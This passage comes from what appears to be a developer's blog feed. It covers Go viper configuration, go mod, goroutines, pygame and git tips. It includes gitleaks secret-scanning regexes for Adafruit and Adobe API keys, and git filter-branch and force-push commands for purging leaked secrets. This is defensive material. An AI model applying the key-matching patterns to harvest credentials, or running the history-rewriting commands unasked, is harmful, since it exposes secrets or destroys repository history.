&#123;viper.SetConfigName(&quot;config&quot;)viper.SetConfigType(&quot;toml&quot;)viper.AddConfigPath(&quot;.&quot;)err := viper.ReadInConfig()if err != nil &#123;    log.Fatal(&quot;read config failed: %v&quot;, err)&#125;viper.WatchConfig()fmt.Println(&quot;redis port before sleep: &quot;, viper.Get(&quot;redis.port&quot;))time.Sleep(time.Second * 10)fmt.Println(&quot;redis port after sleep: &quot;, viper.Get(&quot;redis.port&quot;))&#125;</code></pre><p>只需要调用<code>viper.WatchConfig</code>，viper 会自动监听配置修改。如果有修改，重新加载的配置。<br>上面程序中，我们先打印redis.port的值，然后Sleep 10s。在这期间修改配置中redis.port的值，Sleep结束后再次打印。</p><p>另外，还可以为配置修改增加一个回调：</p><pre><code>viper.OnConfigChange(func(e fsnotify.Event) &#123;fmt.Printf(&quot;Config file:%s Op:%s\n&quot;, e.Name, e.Op)&#125;)</code></pre><p>这样文件修改时会执行这个回调。</p><p>viper 使用<code>fsnotify</code>这个库来实现监听文件修改的功能。</p><h3 id="gitleaks案例-读取-Rule-这种列表的toml数据"><a href="#gitleaks案例-读取-Rule-这种列表的toml数据" class="headerlink" title="gitleaks案例:读取[[Rule]]这种列表的toml数据"></a>gitleaks案例:读取[[Rule]]这种列表的toml数据</h3><p>如这里结构体写的 Rules 是一个 []</p><pre><code>type ViperConfig struct &#123;    Description string    Extend      Extend    Rules       []struct &#123;        ID          string        Description string        Entropy     float64        SecretGroup int        Regex       string        Keywords    []string        Path        string        Tags        []string        Allowlist struct &#123;            Regexes   []string            Paths     []string            Commits   []string            StopWords []string        &#125;    &#125;    Allowlist struct &#123;        Regexes   []string        Paths     []string        Commits   []string        StopWords []string    &#125;&#125;</code></pre><p>在toml中，其配置内容如下，是多个<code>[[Rules]]</code>这种写法</p><pre><code># [ GitLeaks原本的规则 ][[rules]]description = &quot;应用凭证--Adafruit API Key&quot;id = &quot;adafruit-api-key&quot;regex = &#39;&#39;&#39;(?i)(?:adafruit)(?:[0-9a-z\-_\t .]&#123;0,20&#125;)(?:[\s|&#39;]|[\s|&quot;])&#123;0,3&#125;(?:=|&gt;|:=|\|\|:|&lt;=|=&gt;|:)(?:&#39;|\&quot;|\s|=|\x60)&#123;0,5&#125;([a-z0-9_-]&#123;32&#125;)(?:[&#39;|\&quot;|\n|\r|\s|\x60|;]|$)&#39;&#39;&#39;secretGroup = 1keywords = [    &quot;adafruit&quot;,][[rules]]description = &quot;应用凭证--Adobe Client ID (OAuth Web)&quot;id = &quot;adobe-client-id&quot;regex = &#39;&#39;&#39;(?i)(?:adobe)(?:[0-9a-z\-_\t .]&#123;0,20&#125;)(?:[\s|&#39;]|[\s|&quot;])&#123;0,3&#125;(?:=|&gt;|:=|\|\|:|&lt;=|=&gt;|:)(?:&#39;|\&quot;|\s|=|\x60)&#123;0,5&#125;([a-f0-9]&#123;32&#125;)(?:[&#39;|\&quot;|\n|\r|\s|\x60|;]|$)&#39;&#39;&#39;secretGroup = 1keywords = [    &quot;adobe&quot;,]</code></pre><h3 id="设置别名"><a href="#设置别名" class="headerlink" title="设置别名"></a>设置别名</h3><pre><code>viper.RegisterAlias(&quot;loud&quot;, &quot;Verbose&quot;)viper.Set(&quot;verbose&quot;, true) // same result as next lineviper.Set(&quot;loud&quot;, true)   // same result as prior lineviper.GetBool(&quot;loud&quot;) // trueviper.GetBool(&quot;verbose&quot;) // true</code></pre><h3 id="从io-Reader读取配置，例：读取bindata打包文件到viper"><a href="#从io-Reader读取配置，例：读取bindata打包文件到viper" class="headerlink" title="从io.Reader读取配置，例：读取bindata打包文件到viper"></a>从io.Reader读取配置，例：读取bindata打包文件到viper</h3><pre><code>viper.SetConfigType(&quot;yaml&quot;) // or viper.SetConfigType(&quot;YAML&quot;)// any approach to require this configuration into your program.var yamlExample = []byte(`Hacker: truename: stevehobbies:- skateboarding- snowboarding- goclothing:jacket: leathertrousers: denimage: 35eyes : brownbeard: true`)viper.ReadConfig(bytes.NewBuffer(yamlExample))viper.Get(&quot;name&quot;) // this would be &quot;steve&quot;</code></pre><h3 id="绑定环境变量"><a href="#绑定环境变量" class="headerlink" title="绑定环境变量"></a>绑定环境变量</h3><pre><code>func init() &#123; // 绑定环境变量 viper.BindEnv(&quot;redis.port&quot;) viper.BindEnv(&quot;go.path&quot;, &quot;GOPATH&quot;) &#125; func main() &#123; // 省略部分代码 fmt.Println(&quot;go path: &quot;, viper.Get(&quot;go.path&quot;)) &#125;</code></pre><p>调用BindEnv方法，如果只传入一个参数，则这个参数既表示键名，又表示环境变量名。 如果传入两个参数，则第一个参数表示键名，第二个参数表示环境变量名。</p><p>还可以通过viper.SetEnvPrefix方法设置环境变量前缀，这样一来，通过AutomaticEnv和一个参数的BindEnv绑定的环境变量， 在使用Get的时候，viper 会自动加上这个前缀再从环境变量中查找。</p><p>如果对应的环境变量不存在，viper 会自动将键名全部转为大写再查找一次。所以，使用键名gopath也能读取环境变量GOPATH的值。</p><h3 id="前缀的设置"><a href="#前缀的设置" class="headerlink" title="前缀的设置"></a>前缀的设置</h3><pre><code>SetEnvPrefix(&quot;spf&quot;) // will be uppercased automaticallyBindEnv(&quot;id&quot;)os.Setenv(&quot;SPF_ID&quot;, &quot;13&quot;) // typically done outside of the appid := Get(&quot;id&quot;) // 13</code></pre><h3 id="Unmarshal到结构体中"><a href="#Unmarshal到结构体中" class="headerlink" title="Unmarshal到结构体中"></a>Unmarshal到结构体中</h3><pre><code>package main import ( &quot;fmt&quot; &quot;log&quot; &quot;github.com/spf13/viper&quot; ) type Config struct &#123; AppName string LogLevel string MySQL MySQLConfig Redis RedisConfig &#125; type MySQLConfig struct &#123; IP string Port int User string Password string Database string &#125; type RedisConfig struct &#123; IP string Port int &#125; func main() &#123; viper.SetConfigName(&quot;config&quot;) viper.SetConfigType(&quot;toml&quot;) viper.AddConfigPath(&quot;.&quot;) err := viper.ReadInConfig() if err != nil &#123; log.Fatal(&quot;read config failed: %v&quot;, err) &#125; var c Config viper.Unmarshal(&amp;c) fmt.Println(c.MySQL) &#125;</code></pre><h3 id="viper和cobra结合"><a href="#viper和cobra结合" class="headerlink" title="viper和cobra结合"></a>viper和cobra结合</h3><pre><code>serverCmd.Flags().Int(&quot;port&quot;, 1138, &quot;Port to run Application server on&quot;)viper.BindPFlag(&quot;port&quot;, serverCmd.Flags().Lookup(&quot;port&quot;))</code></pre><h3 id="viper和pflag结合"><a href="#viper和pflag结合" class="headerlink" title="viper和pflag结合"></a>viper和pflag结合</h3><pre><code>pflag.Int(&quot;flagname&quot;, 1234, &quot;help message for flagname&quot;)pflag.Parse()viper.BindPFlags(pflag.CommandLine)i := viper.GetInt(&quot;flagname&quot;) // retrieve values from viper instead of pflag</code></pre><p>或者是：</p><pre><code>func init() &#123; pflag.Int(&quot;redis.port&quot;, 8381, &quot;Redis port to connect&quot;) // 绑定命令行 viper.BindPFlags(pflag.CommandLine) &#125;</code></pre><h3 id="gitleaks案例：同viper要求读取2个配置文件，后者覆盖前者"><a href="#gitleaks案例：同viper要求读取2个配置文件，后者覆盖前者" class="headerlink" title="gitleaks案例：同viper要求读取2个配置文件，后者覆盖前者"></a>gitleaks案例：同viper要求读取2个配置文件，后者覆盖前者</h3><p>此次案例参考链接: <a href="https://treexie.gitbook.io/articles/viper">https://treexie.gitbook.io/articles/viper</a></p><p>背景: 要求打包gitleaks，把toml的默认配置文件嵌套进去，然后该默认的配置文件我们可控，且支持用户对其中某个单条的配置规则的修改或者添加。</p><p>参考链接中示例如下:</p><pre><code>func initConfig() (err error) &#123;    configType := &quot;yml&quot;    defaultPath := &quot;./configs&quot;    v := viper.New()    // 从default中读取默认的配置    v.SetConfigName(&quot;default&quot;)    v.AddConfigPath(defaultPath)    v.SetConfigType(configType)    err = v.ReadInConfig()    if err != nil &#123;        return    &#125;    configs := v.AllSettings()    // 将default中的配置全部以默认配置写入    for k, v := range configs &#123;        viper.SetDefault(k, v)    &#125; // 在这里使用到了viper.Set的方式设置值。 有Set()和SetDefault() 两个方法    env := os.Getenv(&quot;GO_ENV&quot;)    // 根据配置的env读取相应的配置信息    if env != &quot;&quot; &#123;        viper.SetConfigName(env)        viper.AddConfigPath(defaultPath)        viper.SetConfigType(configType)        err = viper.ReadInConfig()// 这里继续重复进行读取        if err != nil &#123;            return        &#125;    &#125;    return&#125;</code></pre><p>量来进行赋值传递</p><pre><code>// 处理[allowlist] 开始        if user_custom_configs[&quot;allowlist&quot;] != nil &#123;            var tmpConfigAllowlist map[string]interface&#123;&#125;            tmpConfigAllowlist = make(map[string]interface&#123;&#125;)            for k, v := range configs[&quot;allowlist&quot;].(map[string]interface&#123;&#125;) &#123;                tmpConfigAllowlist[k] = v                //fmt.Println(k)                //fmt.Println(v)            &#125;            user_custom_configs_allowlist := user_custom_configs[&quot;allowlist&quot;].(map[string]interface&#123;&#125;)            for k, v := range user_custom_configs_allowlist &#123;                if k == &quot;paths&quot; &#123;                    tmpConfigAllowlist[k] = v                &#125;            &#125;            configs[&quot;allowlist&quot;] = tmpConfigAllowlist        &#125;</code></pre><h3 id="将viper中的toml读取到结构体"><a href="#将viper中的toml读取到结构体" class="headerlink" title="将viper中的toml读取到结构体"></a>将viper中的toml读取到结构体</h3><p>经过测试，标注的  Description string <code>toml:&quot;description&quot;</code><br>此处最好不要写toml，而是写成 <code>mapstructure:&quot;advice&quot;</code>,会少一些读取不到的奇奇怪怪的错误</p><p>output.toml</p><pre><code># gitlab version with risk[version]# admin setting[settings][settings.password]check_rule=&quot;密码复杂度检测&quot;check_rule_en=&quot;password_complex&quot;description=&quot;密码复杂度检测&quot;advice=&quot;密码复杂度检测&quot;[settings.password.length]check_rule=&quot;最小长度&quot;check_rule_en=&quot;password_least_length&quot;description=&quot;最小长度&quot;advice=&quot;要求数字&quot;</code></pre><p>写的结构体</p><pre><code>type Output struct &#123;    Settings struct &#123;        Password struct &#123;            CheckRule   string `mapstructure:&quot;check_rule&quot;`            CheckRuleEn string `mapstructure:&quot;check_rule_en&quot;`            Description string `mapstructure:&quot;description&quot;`            Advice      string `mapstructure:&quot;advice&quot;`            Length      struct &#123;                CheckRule   string `mapstructure:&quot;check_rule&quot;`                Description string `mapstructure:&quot;description&quot;`                Advice      string `mapstructure:&quot;advice&quot;`            &#125; `toml:&quot;length&quot;`            Num struct &#123;                CheckRule   string `mapstructure:&quot;check_rule&quot;`                Description string `mapstructure:&quot;description&quot;`                Advice      string `mapstructure:&quot;advice&quot;`            &#125; `toml:&quot;num&quot;`            Upper struct &#123;                CheckRule   string `mapstructure:&quot;check_rule&quot;`                Description string `mapstructure:&quot;description&quot;`                Advice      string `mapstructure:&quot;advice&quot;`            &#125; `toml:&quot;upper&quot;`            Lower struct &#123;                CheckRule   string `mapstructure:&quot;check_rule&quot;`                Description string `toml:&quot;description&quot;`                Advice      string `toml:&quot;advice&quot;`            &#125; `toml:&quot;lower&quot;`            Special struct &#123;                CheckRule   string `toml:&quot;check_rule&quot;`                Description string `toml:&quot;description&quot;`                Advice      string `toml:&quot;advice&quot;`            &#125; `toml:&quot;special&quot;`        &#125; `toml:&quot;password&quot;`    &#125; `toml:&quot;settings&quot;`&#125;</code></pre><p>viper读取配置文件后读取到结构体中</p><pre><code>func (o *Output) GetDefault() &#123;    outputConfig := viper.New()    bindataOutputDefaultToml, _ := bindata.Asset(&quot;output.toml&quot;)    outputConfig.SetConfigType(&quot;toml&quot;)    if err := outputConfig.ReadConfig(bytes.NewBuffer(bindataOutputDefaultToml)); err != nil &#123;        panic(&quot;unable to load output config&quot;)        panic(err)    &#125;    outputConfig.Unmarshal(o)&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>go mod init without cobra</title>
      <link href="/2024/08/24/Go/goModInit/"/>
      <url>/2024/08/24/Go/goModInit/</url>
      
        <content type="html"><![CDATA[<p>I wrote an article about how <strong>cobra</strong> inits a golang mod, and I think maybe cobra is more common and frequent. This page is describing without cobra.</p><p>If you want to build a golang model:</p><ol><li>create a directory, for example, I want to create a project named ‘xxx’, then just create it</li><li>cd into the directory, and execute command <code>go mod init github.com/senranja/xxx</code>, then you would see there is a <code>go.mod</code></li><li>Then my case changes into another existent golang project.</li><li>how to <code>import modules</code> and update the <code>go mod</code>?</li></ol><p><img src="/2024/08/24/Go/goModInit/GolangMod.png" alt="GolangMod"></p><p>In goland, normally you can see in its builtin fire exploration, there is one only <code>go.mod</code>, and it actually represents both <code>go.mod</code> and <code>go.sum</code>. If you import exterior golang’s mod, then you <strong>right-click</strong> the <code>go.mod</code> and <code>go mod tidy</code>, IDE automaticly create or update <code>go.sum</code>, dwelt with your code’s new modules.</p><p><img src="/2024/08/24/Go/goModInit/gomodTidy.png" alt="gomodTidy"></p><p>Normally, you dont need to focus what is <code>go mod</code> or <code>go module</code> during using goland, goland will help you to deal with the download of different exterior go module.</p><p>I will show you what are go.sum and go.mod. go.mod contains your name(in the init case I named the project xxx, and in the example files and pictures named gitlab-misconfig) and your module dependencies.</p><p>go.sum is a checkfile, it contains the dependencies’ hash summary, to demostrate its raw dependencies’ hash.</p><p>go.mod</p><pre><code class="lang-go.mod">module gitlab-misconfiggo 1.19require (    github.com/google/go-querystring v1.1.0    github.com/hashicorp/go-cleanhttp v0.5.2    github.com/hashicorp/go-retryablehttp v0.7.1    github.com/sirupsen/logrus v1.9.0    github.com/spf13/cobra v1.6.1    github.com/spf13/viper v1.14.0    github.com/stretchr/testify v1.8.1    github.com/xanzy/go-gitlab v0.79.1    github.com/xuri/excelize/v2 v2.7.0    golang.org/x/oauth2 v0.3.0    golang.org/x/time v0.3.0)require (    github.com/davecgh/go-spew v1.1.1 // indirect    github.com/fsnotify/fsnotify v1.6.0 // indirect    github.com/pelletier/go-toml v1.9.5 // indirect    github.com/pelletier/go-toml/v2 v2.0.5 // indirect    github.com/pmezard/go-difflib v1.0.0 // indirect    github.com/richardlehane/mscfb v1.0.4 // indirect    github.com/richardlehane/msoleps v1.0.3 // indirect    github.com/spf13/afero v1.9.2 // indirect    github.com/spf13/cast v1.5.0 // indirect    github.com/spf13/jwalterweatherman v1.1.0 // indirect    github.com/spf13/pflag v1.0.5 // indirect)</code></pre><p>go.sum</p><pre><code class="lang-go.sum">cloud.google.com/go v0.26.0/go.mod h1:aQUYkXzVsufM+DwF1aE+0xfcU+56JwCaLick0ClmMTw=cloud.google.com/go v0.34.0/go.mod h1:aQUYkXzVsufM+DwF1aE+0xfcU+56JwCaLick0ClmMTw=cloud.google.com/go v0.38.0/go.mod h1:990N+gfupTy94rShfmMCWGDn0LpTmnzTp2qbd1dvSRU=cloud.google.com/go v0.44.1/go.mod h1:iSa0KzasP4Uvy3f1mN/7PiObzGgflwredwwASm/v6AU=cloud.google.com/go v0.44.2/go.mod h1:60680Gw3Yr4ikxnPRS/oxxkBccT6SA1yMk63TGekxKY=cloud.google.com/go v0.44.3/go.mod h1:60680Gw3Yr4ikxnPRS/oxxkBccT6SA1yMk63TGekxKY=</code></pre>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>git重写历史</title>
      <link href="/2024/08/24/git/git%E9%87%8D%E5%86%99%E5%8E%86%E5%8F%B2/"/>
      <url>/2024/08/24/git/git%E9%87%8D%E5%86%99%E5%8E%86%E5%8F%B2/</url>
      
        <content type="html"><![CDATA[<p>在第一家公司工作，我曾经写了从git history检查secret leaks的引擎工作。但是当时作为新人，对git history了解有限，当时发现git目录下secret已被删除，但是扫描git history时又依旧检测出本来已经被删除的secret的幽灵。后来才知道，原来是git history是持续性存储历史代码，而我当时单纯从最新commit删除了secret，但是git history中依然会存在这个code snippet。</p><p>可惜当时工作的时候并没有对我的代码扫描器做更进一步规划，也未能及时和领导、客户提出问题所在，后来离职后，我自个儿研究，发现确实有git重写历史的工具，尽管他不那么普遍。遗憾我没有想到这么多，是我过去的失误，今天以blog补上当时我忘记的知识点。</p><p>如果要删除 git history 带来的 leakage, 需要先把这个文件删除，然后以文件为单位将git history改写，最后再重新把正确的文件上传即可。</p><p>git重写历史步骤如下：</p><pre><code>git filter-branch --index-filter &quot;git rm -r --cached --ignore-unmatch ./部署文件&quot; HEAD`git filter-branch --index-filter &quot;git rm -r --cached --ignore-unmatch ./backend/volume/media/import_excel_upload/*&quot; HEAD</code></pre><p>检查成功没有这个文件后，然后</p><pre><code>git push --force</code></pre><p>如果提示需要加 -f 强制重写，如：</p><pre><code>git filter-branch -f --index-filter &quot;git rm -r --cached --ignore-unmatch ./backend/volume/media/import_excel_upload/*&quot; HEAD</code></pre><p>最后git push即可</p>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>goland goroutine, workers and chan</title>
      <link href="/2024/08/24/Go/go_gorutines/"/>
      <url>/2024/08/24/Go/go_gorutines/</url>
      
        <content type="html"><![CDATA[<h3 id="Code-Snippet"><a href="#Code-Snippet" class="headerlink" title="Code Snippet"></a>Code Snippet</h3><pre><code>package mainimport (    &quot;fmt&quot;    &quot;sync&quot;)func worker(ports chan int, wg *sync.WaitGroup) &#123;    for p := range ports &#123;    # P receive one value from the chan ports        fmt.Println(&quot;p&quot;, p)        wg.Done()    &#125;&#125;func main() &#123;    ports := make(chan int, 100)    var wg sync.WaitGroup    for i := 0; i &lt; cap(ports); i++ &#123;        go worker(ports, &amp;wg)    &#125;    for i := 1; i &lt; 1024; i++ &#123;        wg.Add(1)        ports &lt;- i    &#125;    wg.Wait()    close(ports)&#125;</code></pre><h3 id="口诀"><a href="#口诀" class="headerlink" title="口诀"></a>口诀</h3><ol><li><p>Init Async Tasks, wg</p><p> Init make chain 和 var wg<br> ports := make(chan int, 100)<br> var wg sync.WaitGroup</p></li><li><p>俩循环，一 纯go worker，二 add 1 扔任务：</p><h2 id="cap-go-worker"><a href="#cap-go-worker" class="headerlink" title="cap go worker"></a>cap go worker</h2><p>wg.Add(1)<br>ports &lt;- i</p></li><li><p>单worker内 Done </p><p> for p := range ports {</p><pre><code>     fmt.Println(&quot;p&quot;, p)     wg.Done() &#125;</code></pre></li><li><p>俩终结，等与关</p><p> wg.Wait()<br> close(ports)</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pygame exploration</title>
      <link href="/2024/08/24/trivia/pygame%20exploration/"/>
      <url>/2024/08/24/trivia/pygame%20exploration/</url>
      
        <content type="html"><![CDATA[<p>Sometimes I think interests can motivate programmers to explore new techniques and keep the enthusiam to optimise current workout. So last week I researched pygame and just had a little try to use it, unfortunately I found it is not such useful frames. I think as a new learner, you may heard Django, Flask and Pygame, because they are popular framework by Python. But eventually, I need to say, pygame is not such useful and interesting as Django.</p><p>What I learned are from these sources:</p><pre><code>https://github.com/pygame/pygamehttps://www.pygame.org/docs/https://www.youtube.com/watch?v=AY9MnQ4x3zk&amp;t=636s</code></pre><p>I run some codes of pygame, and the conclusion:</p><ol><li><p>It cannot produce a little tremendous or remarkable games, such as Red alert. It can only basicly produce too simple little games, and I think its maxmium limit is Metal Slug, such as the reference: <a href="https://www.youtube.com/watch?v=hnKocNdF9-U">https://www.youtube.com/watch?v=hnKocNdF9-U</a> . If you want to develop great ideas and games, some famous gaming engines are recommanded.</p></li><li><p>It cannot be used in Scientific calculation and visibility. It can show picture clearly, but many lines, curves, arcs, texts are too pixel. If you use pygame to draw some graphs or charts, the workout could be much ambiguous with out precision.</p></li><li><p>It is weak in building and compilation. I often see others use Pyinstaller(the file size could be too big normally) to compile the source codes into an execution file. As a frame of game, it lacks the transplatforms functions.</p></li></ol><p>Of course, if you want to make GalGame(My friend’s idea, not mine), I think pygame is suitable, it can simply load images, audio and video, you can use the collision feature to realize your ideas rapidly, but how to generate your ideal images would be a challange.</p><p>Totally, when talking about games, my friends and classmates rarely use pygame, and I agree it may have little useful and amazing functions.</p>]]></content>
      
      
      <categories>
          
          <category> trivia </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>.gitignore</title>
      <link href="/2024/04/09/git/gitignore/"/>
      <url>/2024/04/09/git/gitignore/</url>
      
        <content type="html"><![CDATA[<p>官方文档：<code>https://github.com/github/gitignore</code></p><h3 id="我的-gitignore模板"><a href="#我的-gitignore模板" class="headerlink" title="我的.gitignore模板"></a>我的.gitignore模板</h3><pre><code># Logslogs*.lognpm-debug.log*yarn-debug.log*yarn-error.log*pnpm-debug.log*lerna-debug.log*node_modulesdistdist-ssr*.local# big files*.mp4backend/volume/media/documents/*!backend/volume/media/documents/.gitkeepbackend/volume/media/import_excel_upload/*!backend/volume/media/import_excel_upload/.gitkeepbackend/volume/media/videos/*!backend/volume/media/videos/.gitkeep# python**/__pycache__/**.pyc# 忽略pycharm**/.idea/# 忽略虚拟环境**/venv# Editor directories and files**/.vscode/*!.vscode/extensions.json.idea.DS_Store*.suo*.ntvs**.njsproj*.sln*.sw?</code></pre><h3 id="其他示例"><a href="#其他示例" class="headerlink" title="其他示例"></a>其他示例</h3><pre><code># 忽略所有 .a 结尾的文件a# 但lib.a 除外!lib.a# 仅仅忽略项目根目录下的 TODO 文件，不包括 subdir/TODO/TODO# 忽略build/ 目录下的所有文件build/# 会忽略 doc/notes.txt 但不包括 doc/server/arch.txtdoc/.txt</code></pre>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>keep empty directory in git</title>
      <link href="/2024/04/09/git/gitkeep/"/>
      <url>/2024/04/09/git/gitkeep/</url>
      
        <content type="html"><![CDATA[<p>目录中新建空文件 <strong>.gitkeep</strong> 即可</p>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>远程获取所有分支</title>
      <link href="/2024/04/09/git/%E4%BB%8E%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E5%88%86%E6%94%AF/"/>
      <url>/2024/04/09/git/%E4%BB%8E%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E5%88%86%E6%94%AF/</url>
      
        <content type="html"><![CDATA[<pre><code>git clone xxxcd xxxgit branch -r | grep -v &#39;\-&gt;&#39; | while read remote; do git branch --track &quot;$&#123;remote#origin/&#125;&quot; &quot;$remote&quot;; donegit fetch --allgit pull --all(git pull –all在功能上包含git fetch --all)</code></pre>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>merge conflict</title>
      <link href="/2024/04/09/git/%E5%86%B2%E7%AA%81%E8%A7%A3%E5%86%B3/"/>
      <url>/2024/04/09/git/%E5%86%B2%E7%AA%81%E8%A7%A3%E5%86%B3/</url>
      
        <content type="html"><![CDATA[<p>git push提示冲突</p><p><img src="/2024/04/09/git/%E5%86%B2%E7%AA%81%E8%A7%A3%E5%86%B3/2024-04-09-19-47-59.png" alt="2024-04-09-19-47-59"></p><p>会在源文件中看到标记的冲突的HEAD</p><p><img src="/2024/04/09/git/%E5%86%B2%E7%AA%81%E8%A7%A3%E5%86%B3/2024-04-09-19-48-22.png" alt="2024-04-09-19-48-22"></p><p>修改完在git add . 再commit push</p><p>如果没有实质差异，“current change”是你的修改的，那个commit id的是已存在的，按照已存在的来</p><h3 id="git-stash"><a href="#git-stash" class="headerlink" title="git stash"></a>git stash</h3><pre><code>git stashgit commitgit stash pop</code></pre><p>接下来diff一下此文件看看自动合并的情况，并作出相应修改。</p><p>git stash: 备份当前的工作区的内容，从最近的一次提交中读取相关内容，让工作区保证和上次提交的内容一致。同时，将当前的工作区内容保存到Git栈中。</p><p>git stash pop: 从Git栈中读取最近一次保存的内容，恢复工作区的相关内容。由于可能存在多个Stash的内容，所以用栈来管理，pop会从最近的一个stash中读取内容并恢复。</p><p>git stash list: 显示Git栈内的所有备份，可以利用这个列表来决定从那个地方恢复。</p><p>git stash clear: 清空Git栈。此时使用gitg等图形化工具会发现，原来stash的哪些节点都消失了。</p>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>branch</title>
      <link href="/2024/04/09/git/%E5%88%86%E6%94%AF%E6%93%8D%E4%BD%9C/"/>
      <url>/2024/04/09/git/%E5%88%86%E6%94%AF%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#查看分支">查看分支</a><ul><li><a href="#列出本地所有的分支">列出本地所有的分支</a></li><li><a href="#分支合并行为可视化">分支合并行为可视化</a></li><li><a href="#查看分支与远程的关联">查看分支与远程的关联</a></li><li><a href="#查看所有分支">查看所有分支</a></li></ul></li><li><a href="#切换分支">切换分支</a></li><li><a href="#detached-head-和-checkout-commit然后修改入新branch">Detached HEAD 和 checkout commit然后修改入新branch</a></li></ul><h1 id="查看分支"><a href="#查看分支" class="headerlink" title="查看分支"></a>查看分支</h1><h3 id="列出本地所有的分支"><a href="#列出本地所有的分支" class="headerlink" title="列出本地所有的分支"></a>列出本地所有的分支</h3><pre><code>git branch </code></pre><p>查看分支详细信息，列出本地所有的分支, + hash 信息</p><pre><code>git branch -v</code></pre><h3 id="分支合并行为可视化"><a href="#分支合并行为可视化" class="headerlink" title="分支合并行为可视化"></a>分支合并行为可视化</h3><p>为了方便查看分支来源，比如大型项目通常会有多个分支以及分支合并的行为，单纯的使用终端查看分支来源、log并不直观。如果发生分支合并的异常行为，需要溯源，直观的观察git分支是必须的一个审计行为。</p><p>我看有推荐<code>github desktop</code>, <code>source tree</code>和<code>GitKraken</code>(收费)，但是之前上班的时候看师傅用的<strong>IDEA GIT分支图</strong>也有不错的效果，基本Jetbrain的所有IDE都有这个插件。点击菜单栏的<code>git</code>-&gt;<code>log</code>。</p><p><img src="/2024/04/09/git/%E5%88%86%E6%94%AF%E6%93%8D%E4%BD%9C/pycharm_git_log.png" alt="pycharm_git_log"></p><h3 id="查看分支与远程的关联"><a href="#查看分支与远程的关联" class="headerlink" title="查看分支与远程的关联"></a>查看分支与远程的关联</h3><p><code>git branch -vv</code> #列出本地所有的分支, + hash 信息 + 与远程的关联信息</p><p>虽然默认本地和远程大部分都是同名的, 但是在多分支的场景下还是会出现不同名的情况<br>通过这个命令进行确认, 非常好用.</p><h3 id="查看所有分支"><a href="#查看所有分支" class="headerlink" title="查看所有分支"></a>查看所有分支</h3><h1 id="列出所有的分支-远程和本地-这个命令在拉取别人的分支的时候非常有用-比如"><a href="#列出所有的分支-远程和本地-这个命令在拉取别人的分支的时候非常有用-比如" class="headerlink" title="列出所有的分支(远程和本地)这个命令在拉取别人的分支的时候非常有用, 比如"></a>列出所有的分支(远程和本地)这个命令在拉取别人的分支的时候非常有用, 比如</h1><pre><code>git branch -agit branch -a | grep xxx</code></pre><h1 id="切换分支"><a href="#切换分支" class="headerlink" title="切换分支"></a>切换分支</h1><pre><code># `-b` means create a new branchgit checkout -b new-branch-namegit checkout &lt;commit-hash&gt;</code></pre><h1 id="Detached-HEAD-和-checkout-commit然后修改入新branch"><a href="#Detached-HEAD-和-checkout-commit然后修改入新branch" class="headerlink" title="Detached HEAD 和 checkout commit然后修改入新branch"></a>Detached HEAD 和 checkout commit然后修改入新branch</h1><p>In Git, a <strong>detached HEAD</strong> state occurs when you are working directly on <strong>a specific commit(not the lastest)</strong> rather than on <strong>the latest commit</strong> of a branch. This can happen when you <strong>checkout a commit, a tag, or a remote branch</strong> directly, without creating a new branch.</p><p><strong>HEAD</strong> is a <code>pointer</code> in Git that typically points to the latest commit on the current branch.</p>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>delete something useless before gitignore</title>
      <link href="/2024/04/09/git/%E5%88%A0%E9%99%A4gitignore%E4%B9%8B%E5%89%8D%E7%9A%84ignore%E6%96%87%E4%BB%B6/"/>
      <url>/2024/04/09/git/%E5%88%A0%E9%99%A4gitignore%E4%B9%8B%E5%89%8D%E7%9A%84ignore%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="重写了gitignore但是想删除已提交但想忽略的内容"><a href="#重写了gitignore但是想删除已提交但想忽略的内容" class="headerlink" title="重写了gitignore但是想删除已提交但想忽略的内容"></a>重写了gitignore但是想删除已提交但想忽略的内容</h1><p>已经提交过的文件或者文件夹怎么办？此时更改.gitignore文件对已经提交的文件是无效的。</p><p>首先，编辑.gitignore文件。</p><p>然后如果是单个文件，可以使用如下命令从仓库中删除：</p><pre><code>git rm --cached logs/xx.log</code></pre><p>如果是整个目录：</p><pre><code>git rm --cached -r logs</code></pre><p>如果文件很多，那么直接</p><pre><code>git rm --cached -r .</code></pre><p>如果提示某个文件无法忽略，可以添加-f参数强制忽略。</p><pre><code>git rm -f --cached logs/xx.log</code></pre><p>然后</p><pre><code>git add .git commit -m &quot;Update .gitignore&quot;</code></pre><p>把被忽略的某个文件强制添加回去：</p><pre><code>git add -f filename</code></pre><p>ignore规则检查：</p><pre><code>git check-ignore</code></pre>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>build a new repo</title>
      <link href="/2024/04/09/git/%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93/"/>
      <url>/2024/04/09/git/%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93/</url>
      
